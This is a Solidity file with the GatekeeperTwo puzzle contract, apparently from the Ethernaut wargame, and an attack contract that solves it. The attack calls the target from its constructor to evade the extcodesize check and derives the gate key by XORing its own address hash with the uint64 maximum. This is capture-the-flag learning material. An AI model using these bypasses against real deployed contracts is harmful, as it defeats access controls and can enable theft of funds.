// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract PassTheGate2{


    constructor(GatekeeperTwo target){
        //get the magicalNumber hashing the (address(this)) instead of msg.sender
        uint64 magicalNumber = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
        //parse to bytes8
        bytes8 magicBytes = bytes8(magicalNumber);
        //send the call to the target contract.
        require(target.enter(magicBytes),"Failed entering");
    }

}